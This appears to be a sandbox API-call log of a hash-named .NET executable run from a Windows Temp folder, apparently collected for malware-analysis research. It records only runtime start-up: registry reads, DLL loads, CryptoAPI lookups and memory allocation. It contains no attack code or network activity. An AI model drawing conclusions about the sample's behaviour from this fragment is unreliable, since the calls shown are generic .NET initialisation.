+GetSystemInfo,1,0,1542888185.484625
+CreateThread,0x00462228#0x691f59c0#1864#4#1032192,260,1542888185.484625
+NtResumeThread,1#1776#0x00000104,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+NtClose,0x00000108,0,1542888185.484625
+NtOpenKey,0x00000108#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\CustomLocale,0,1542888185.484625
+NtQueryValueKey,0x00000108##1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\CustomLocale\en-US#0#,3221225524,1542888185.484625
+NtClose,0x00000108,0,1542888185.484625
+NtOpenKey,0x00000108#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\ExtendedLocale,0,1542888185.484625
+NtQueryValueKey,0x00000108##1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\ExtendedLocale\en-US#0#,3221225524,1542888185.484625
+NtClose,0x00000108,0,1542888185.484625
+LdrLoadDll,0#kernel32.dll#0#kernel32#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,SortGetHandle#KERNEL32#0x760ffe5b#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,SortCloseHandle#KERNEL32#0x761542dc#0#0x760b0000,0,1542888185.484625
+GetSystemWindowsDirectoryW,C:\Windows,10,1542888185.484625
+NtCreateFile,128#1#1#96#1#0x00000108#0x80100080#\??\C:\Windows\Globalization\Sorting\sortdefault.nls#C:\Windows\Globalization\Sorting\sortdefault.nls,0,1542888185.484625
+NtCreateSection,2#0x0000010c#0x00000000#0x00000108#0x000f0005#,0,1542888185.484625
+NtMapViewOfSection,0#0#1776#2945024#0xffffffff#0x0000010c#0x03b00000##0#2,0,1542888185.484625
+NtClose,0x0000010c,0,1542888185.484625
+NtClose,0x00000108,0,1542888185.484625
+RegOpenKeyExW,0x00000108#Software\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32#0x80000002#0,0,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\LatestIndex#0x00000108#LatestIndex#4#24,0,1542888185.484625
+RegOpenKeyExW,0x0000010c#Software\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32#0x80000002#0,0,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\LatestIndex#0x0000010c#LatestIndex#4#24,0,1542888185.484625
+NtCreateFile,0#1#1#96#1#0x00000110#0x80100080#\??\C:\Windows\assembly\NativeImages_v4.0.30319_32\index18.dat#C:\Windows\assembly\NativeImages_v4.0.30319_32\index18.dat,0,1542888185.484625
+RegOpenKeyExW,0x00000114#index18#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\index18#0x0000010c#0,0,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\index18\NIUsageMask#0x00000114#NIUsageMask#3#ÿÿÿ,0,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\index18\ILUsageMask#0x00000114#ILUsageMask#3#ÿÿÿÿÿ,0,1542888185.484625
+RegCloseKey,0x00000114,0,1542888185.484625
+RegCloseKey,0x00000108,0,1542888185.484625
+RegOpenKeyExW,0x00000108#NI\181938c6\1499ca42#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42#0x0000010c#0,0,1542888185.484625
+RegEnumKeyExW,#0#1#0x00000108#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42,0,1542888185.499625
+RegEnumKeyExW,#1#1#0x00000108#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42,259,1542888185.499625
+RegCloseKey,0x00000108,0,1542888185.499625
+RegOpenKeyExW,0x00000108#NI\181938c6\1499ca42\1#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1#0x0000010c#0,0,1542888185.499625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\DisplayName#0x00000108#DisplayName#1#mscorlib,4.0.0.0,,b77a5c561934e089|,0,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\ConfigMask#0x00000108#ConfigMask#4#4361,0,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\ConfigString#0x00000108#ConfigString#1#,0,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\MVID#0x00000108#MVID#3#$oZ»hkÍò-5°ê,0,1542888185.499625
+RegCloseKey,0x00000108,0,1542888185.499625
+RegOpenKeyExW,0x00000108#NI\181938c6\1499ca42\1#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1#0x0000010c#0,0,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\EvalationData#0x00000108#EvalationData#0#,2,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\Status#0x00000108#Status#4#0,0,1542888185.499625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\ILDependencies#0x00000108#ILDependencies#3#BÊøe4e          |,0,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\NIDependencies#0x00000108#NIDependencies#0#,2,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\MissingDependencies#0x00000108#MissingDependencies#0#,2,1542888185.499625
+RegCloseKey,0x00000108,0,1542888185.499625
+RegOpenKeyExW,0x00000108#IL\1499ca42\653465f8\1#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1#0x0000010c#0,0,1542888185.499625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\DisplayName#0x00000108#DisplayName#1#mscorlib,4.0.0.0,,b77a5c561934e089|,0,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\Status#0x00000108#Status#4#8198,0,1542888185.499625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\Modules#0x00000108#Modules#1#normidna.nlp||normnfc.nlp||normnfd.nlp||normnfkc.nlp||normnfkd.nlp|,0,1542888185.499625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\SIG#0x00000108#SIG#3#×N½7s@Qî%­§º×ØxxRkên!+HXØ@F|,0,1542888185.499625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\TargetedPatchBand#0x00000108#TargetedPatchBand#3#1.0.21-0                         |,0,1542888185.499625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\LastModTime#0x00000108#LastModTime#3#%KÂpaÓ,0,1542888185.499625
+RegCloseKey,0x00000108,0,1542888185.499625
+RegCreateKeyExW,0#Software\Microsoft\Fusion\GACChangeNotification\Default##0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion\GACChangeNotification\Default#0#0x80000002#0x00000108,0,1542888185.499625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\GACChangeNotification\Default\mscorlib,4.0.0.0,,b77a5c561934e089,x86#0x00000108#mscorlib,4.0.0.0,,b77a5c561934e089,x86#3#%KÂpaÓ|,0,1542888185.499625
+GetFileAttributesW,32#C:\Windows\Microsoft.Net\assembly\GAC_32\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll#C:\Windows\Microsoft.Net\assembly\GAC_32\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll,32,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+SetErrorMode,32769,32775,1542888185.499625
+NtProtectVirtualMemory,0#0#1776#4096#0xffffffff#0x68370000#4#0,0,1542888185.499625
+NtProtectVirtualMemory,0#0#1776#4096#0xffffffff#0x68370000#2#0,0,1542888185.499625
+LdrLoadDll,0#C:\Windows\assembly\NativeImages_v4.0.30319_32\mscorlib\246f1a5abb686b9dcdf22d3505b08cea\mscorlib.ni.dll#0#mscorlib.ni#0x68370000,0,1542888185.499625
+SetErrorMode,32775,32773,1542888185.499625
+LdrLoadDll,0#AdvApi32.dll#0#AdvApi32#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptAcquireContextA#ADVAPI32#0x777391dd#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptAcquireContextW#ADVAPI32#0x7773df14#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptReleaseContext#ADVAPI32#0x7773e124#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptCreateHash#ADVAPI32#0x7773df4e#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptDestroyHash#ADVAPI32#0x7773df66#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptHashData#ADVAPI32#0x7773df36#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptGetHashParam#ADVAPI32#0x7773df7e#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptImportKey#ADVAPI32#0x7773c532#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptExportKey#ADVAPI32#0x777391ea#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptGenKey#ADVAPI32#0x77738ee9#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptGetKeyParam#ADVAPI32#0x777577cb#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptDestroyKey#ADVAPI32#0x7773c51a#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptVerifySignatureA#ADVAPI32#0x777732c8#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptVerifySignatureW#ADVAPI32#0x7773c54a#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptSignHashA#ADVAPI32#0x777732a8#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptSignHashW#ADVAPI32#0x777732b8#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptGetProvParam#ADVAPI32#0x77773218#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptGetUserKey#ADVAPI32#0x77773228#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptEnumProvidersA#ADVAPI32#0x777731d8#0#0x77730000,0,1542888185.499625
+LdrGetProcedureAddress,CryptEnumProvidersW#ADVAPI32#0x777731e8#0#0x77730000,0,1542888185.499625
+RegOpenKeyExW,0x00000000#Software\Microsoft\StrongName#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\StrongName#0x80000002#0,2,1542888185.499625
+GetFileAttributesW,32#C:\Windows\Microsoft.Net\assembly\GAC_32\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll#C:\Windows\Microsoft.Net\assembly\GAC_32\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll,32,1542888185.499625
+RegCloseKey,0x0000010c,0,1542888185.499625
+NtClose,0x00000110,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+FindFirstFileExW,C:\Windows\Microsoft.Net\assembly\GAC_32\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.INI#C:\Windows\Microsoft.Net\assembly\GAC_32\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.INI,4294967295,1542888185.499625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00430000#4096#4#0,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x00442000#4096#64#0,0,1542888185.499625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x028f2000#4096#4#0,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+SetErrorMode,32769,32775,1542888185.499625
+GetFileAttributesW,8224#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe,8224,1542888185.499625
+FindFirstFileExW,C:\Users#C:\Users,4789704,1542888185.499625
+NtClose,0x00000110,0,1542888185.499625
+FindFirstFileExW,C:\Users\mag#C:\Users\mag,4789704,1542888185.499625
+NtClose,0x00000110,0,1542888185.499625
+FindFirstFileExW,C:\Users\mag\AppData#C:\Users\mag\AppData,4789704,1542888185.499625
+NtClose,0x00000110,0,1542888185.499625
+FindFirstFileExW,C:\Users\mag\AppData\Local#C:\Users\mag\AppData\Local,4789704,1542888185.499625
+NtClose,0x00000110,0,1542888185.499625
+FindFirstFileExW,C:\Users\mag\AppData\Local\Temp#C:\Users\mag\AppData\Local\Temp,4789704,1542888185.499625
+NtClose,0x00000110,0,1542888185.499625
+SetErrorMode,32775,32773,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+GetShortPathNameW,C:\Users\mag\AppData\Local\Temp\493C23~1.EXE#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe,44,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+GetSystemInfo,1,0,1542888185.499625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.499625
+LdrGetProcedureAddress,QueryActCtxW#KERNEL32#0x760f2cc6#0#0x760b0000,0,1542888185.499625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x018f2000#4096#4#0,0,1542888185.499625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x00675000#4096#64#0,0,1542888185.499625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00670000#4096#4#0,0,1542888185.499625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x0067b000#4096#64#0,0,1542888185.515625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x00677000#4096#64#0,0,1542888185.515625
+LdrGetDllHandle,0#kernel32#0x760b0000,0,1542888185.515625
+LdrGetProcedureAddress,GetLocaleInfoEx#KERNEL32#0x760e51e6#0#0x760b0000,0,1542888185.515625
+LdrGetDllHandle,0#kernel32#0x760b0000,0,1542888185.515625
+LdrGetProcedureAddress,LocaleNameToLCID#KERNEL32#0x760f2b93#0#0x760b0000,0,1542888185.515625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\nlssorting.dll#0#nlssorting#0x72960000,0,1542888185.515625
+LdrGetProcedureAddress,SortGetHandle#nlssorting#0x7296402e#0#0x72960000,0,1542888185.515625
+LdrGetProcedureAddress,SortCloseHandle#nlssorting#0x729665c6#0#0x72960000,0,1542888185.515625
+NtCreateFile,128#1#1#96#1#0x00000110#0x80100080#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\SortDefault.nlp#C:\Windows\Microsoft.NET\Framework\v4.0.30319\SortDefault.nlp,0,1542888185.515625
+NtCreateSection,2#0x0000010c#0x00000000#0x00000110#0x000f0005#,0,1542888185.515625
+NtMapViewOfSection,0#0#1776#2957312#0xffffffff#0x0000010c#0x03dd0000##0#2,0,1542888185.515625
+NtClose,0x0000010c,0,1542888185.515625
+NtClose,0x00000110,0,1542888185.515625
+LdrGetDllHandle,0#kernel32#0x760b0000,0,1542888185.515625
+LdrGetProcedureAddress,CompareStringOrdinal#KERNEL32#0x760f5412#0#0x760b0000,0,1542888185.515625
+SetErrorMode,32769,32775,1542888185.515625
+LdrLoadDll,0#kernel32.dll#0#kernel32#0x760b0000,0,1542888185.515625
+SetErrorMode,32775,32773,1542888185.515625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00440000#4096#4#0,0,1542888185.515625
+LdrGetProcedureAddress,GetFullPathName#KERNEL32#0x6869ae18#0#0x760b0000,3221225785,1542888185.515625
+LdrGetProcedureAddress,GetFullPathNameW#KERNEL32#0x760ff6d7#0#0x760b0000,0,1542888185.515625
+GetSystemInfo,1,0,1542888185.515625
+SetErrorMode,32769,32775,1542888185.515625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\ole32.dll#0#ole32#0x00000000,3221225781,1542888185.515625
+SetErrorMode,32775,32773,1542888185.515625
+NtOpenKeyEx,0x00000110#0x00020019#0#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\OLE,0,1542888185.562625
+NtQueryValueKey,0x00000110##2#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\PageAllocatorUseSystemHeap#0#,3221225524,1542888185.562625
+NtClose,0x00000110,0,1542888185.562625
+NtOpenKeyEx,0x00000110#0x00020019#0#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\OLE,0,1542888185.562625
+NtQueryValueKey,0x00000110##2#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\PageAllocatorSystemHeapIsPrivate#0#,3221225524,1542888185.562625
+NtClose,0x00000110,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+LdrGetDllHandle,0#rpcrt4.dll#0x76400000,0,1542888185.562625
+LdrGetProcedureAddress,I_RpcInitNdrImports#RPCRT4#0x7642aefd#0#0x76400000,0,1542888185.562625
+NtOpenKeyEx,0x00000000#0x00020019#0#HKEY_LOCAL_MACHINE\Software\Microsoft\OLE\Tracing,3221225524,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+LdrGetProcedureAddress,DecodePointer#KERNEL32#0x77a8cca0#0#0x760b0000,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+LdrGetProcedureAddress,DecodePointer#KERNEL32#0x77a8cca0#0#0x760b0000,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+LdrGetProcedureAddress,EncodePointer#KERNEL32#0x77a8a225#0#0x760b0000,0,1542888185.562625
+LdrGetProcedureAddress,DecodePointer#KERNEL32#0x77a8cca0#0#0x760b0000,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+NtAllocateVirtualMemory,0#0#1776#8192#0xffffffff#0x018ed000#4096#260#0,0,1542888185.562625
+NtAllocateVirtualMemory,0#0#1776#1032192#0xffffffff#0x017f1000#4096#4#0,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+LdrGetProcedureAddress,DecodePointer#KERNEL32#0x77a8cca0#0#0x760b0000,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+LdrGetProcedureAddress,DecodePointer#KERNEL32#0x77a8cca0#0#0x760b0000,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+LdrGetProcedureAddress,EncodePointer#KERNEL32#0x77a8a225#0#0x760b0000,0,1542888185.562625
+LdrGetProcedureAddress,DecodePointer#KERNEL32#0x77a8cca0#0#0x760b0000,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+NtAllocateVirtualMemory,0#0#1776#8192#0xffffffff#0x03afd000#4096#260#0,0,1542888185.562625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x03a01000#4096#4#0,0,1542888185.562625
+NtOpenProcess,1776#0x00000400#0x0000012c,0,1542888185.562625
+NtClose,0x00000130,0,1542888185.562625
+NtClose,0x0000012c,0,1542888185.562625
+LdrLoadDll,0#ole32.dll#0#ole32#0x76540000,0,1542888185.562625
+LdrGetProcedureAddress,CoInitializeEx#ole32#0x765809ad#0#0x76540000,0,1542888185.562625
+CoInitializeEx,0,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+NtFreeVirtualMemory,65536#16384#1776#0x00493000#0xffffffff,0,1542888185.562625
+NtFreeVirtualMemory,24576#16384#1776#0x00489000#0xffffffff,0,1542888185.562625
+NtAllocateVirtualMemory,0#0#1776#24576#0xffffffff#0x00489000#4096#4#0,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+GetFileAttributesW,4294967295#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe.config#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe.config,4294967295,1542888185.562625
+GetFileAttributesExW,0#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe,1,1542888185.562625
+RegOpenKeyExW,0x00000138#Software\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32#0x80000002#0,0,1542888185.562625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\LatestIndex#0x00000138#LatestIndex#4#24,0,1542888185.562625
+RegOpenKeyExW,0x0000013c#Software\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32#0x80000002#0,0,1542888185.562625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\LatestIndex#0x0000013c#LatestIndex#4#24,0,1542888185.562625
+NtCreateFile,0#1#1#96#1#0x00000140#0x80100080#\??\C:\Windows\assembly\NativeImages_v4.0.30319_32\index18.dat#C:\Windows\assembly\NativeImages_v4.0.30319_32\index18.dat,0,1542888185.562625
+RegOpenKeyExW,0x00000144#index18#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\index18#0x0000013c#0,0,1542888185.562625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\index18\NIUsageMask#0x00000144#NIUsageMask#3#ÿÿÿ,0,1542888185.562625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\index18\ILUsageMask#0x00000144#ILUsageMask#3#ÿÿÿÿÿ,0,1542888185.562625
+RegCloseKey,0x00000144,0,1542888185.562625
+RegCloseKey,0x00000138,0,1542888185.562625
+RegOpenKeyExW,0x00000000#NI\272f89c8\1e558a76#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\272f89c8\1e558a76#0x0000013c#0,2,1542888185.562625
+RegOpenKeyExW,0x00000000#NI\272f89c8\1e558a76#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\272f89c8\1e558a76#0x0000013c#0,2,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+FindFirstFileExW,C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.INI#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.INI,4294967295,1542888185.562625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x00443000#4096#64#0,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00441000#4096#4#0,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+NtCreateFile,0#1#1#96#1#0x00000138#0x80100080#\??\C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe,0,1542888185.562625
+GetFileSize,0x00000138#6656,6656,1542888185.562625
+NtCreateSection,2#0x00000144#0x00000000#0x00000138#0x000f0005#,0,1542888185.562625
+NtMapViewOfSection,0#0#1776#8192#0xffffffff#0x00000144#0x01460000##0#2,0,1542888185.562625
+GetSystemInfo,1,0,1542888185.562625
+NtUnmapViewOfSection,1776#8192#0xffffffff#0x01460000,0,1542888185.562625
+NtClose,0x00000144,0,1542888185.562625
+NtClose,0x00000138,0,1542888185.562625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x0044c000#4096#64#0,0,1542888185.562625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\clrjit.dll#0#clrjit#0x6b5b0000,0,1542888185.562625
+LdrGetProcedureAddress,sxsJitStartup#clrjit#0x6b5f92a0#0#0x6b5b0000,0,1542888185.562625
+LdrGetProcedureAddress,getJit#clrjit#0x6b5f9388#0#0x6b5b0000,0,1542888185.562625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x01460000#4096#4#0,0,1542888185.562625
+RegOpenKeyExW,0x00000144#Software\Microsoft\Fusion\PublisherPolicy\Default#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion\PublisherPolicy\Default#0x80000002#0,0,1542888185.562625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\Latest#0x00000144#Latest#4#4,0,1542888185.562625
+NtCreateFile,0#1#1#96#1#0x00000148#0x80100080#\??\C:\Windows\assembly\pubpol4.dat#C:\Windows\assembly\pubpol4.dat,0,1542888185.562625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\index4#0x00000144#index4#3#ÿ,0,1542888185.562625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\LegacyPolicyTimeStamp#0x00000144#LegacyPolicyTimeStamp#3#        |,0,1542888185.562625
+GetFileAttributesExW,0#C:\Windows\assembly\GAC\PublisherPolicy.tme#C:\Windows\assembly\GAC\PublisherPolicy.tme,0,1542888185.562625
+GetFileAttributesExW,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config#C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config,1,1542888185.562625
+NtCreateFile,128#1#5#96#1#0x0000014c#0x80100080#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config#C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config,0,1542888185.562625
